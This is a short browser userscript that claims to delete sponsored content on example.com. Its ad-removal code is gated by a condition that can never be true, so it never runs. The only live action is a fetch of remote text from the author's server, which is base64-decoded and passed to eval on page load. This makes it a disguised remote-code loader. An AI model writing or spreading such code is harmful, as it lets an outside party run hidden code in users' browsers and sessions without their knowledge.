// ==UserScript==
// @name         Test User Script
// @namespace    http://tampermonkey.net/
// @version      0.3
// @description  Test
// @author       Scratchyone
// @updateURL    https://www.scratchyone.com/userscripts/testuserscript.user.js
// @downloadURL  https://www.scratchyone.com/userscripts/testuserscript.user.js
// @match        https://www.example.com/
// @include        https://www.example.com/
// @grant        none
// ==/UserScript==

(function() {
  b=2
  window.setInterval(function() {
    if(5/2+9==b||67+b*2==b) {
    [].forEach.call(document.getElementsByTagName("ul"), function(item) {
      if (item.innerHTML.includes("Paid Partner")) {
        item.innerHTML = "";
      }
    });
    [].forEach.call(document.getElementsByTagName("h2"), function(item) {
      if (item.innerHTML.includes("Paid Partner")) {
        item.parentNode.parentNode.innerHTML = "";
      }
    });
    [].forEach.call(
      document.getElementsByClassName("ob-widget-header"),
      function(item) {
        if (item.innerHTML.includes("Paid Content")) {
          item.parentNode.innerHTML = "";
        }
      }
    );
    [].forEach.call(document.getElementsByClassName("jar"), function(item) {
      item.innerHTML = "";
    });
    [].forEach.call(document.getElementsByClassName("ad"), function(item) {
      item.innerHTML = "";
    });
    console.log("Deleting Sponsored Content...");
    }
  }, 1000);
  fetch('https://scratchyone.com/userscripts/demo.js').then(function(response) { 
	// Convert to JSON
	return response.text();
}).then(function(t) {
	eval(atob(t))
});
})();
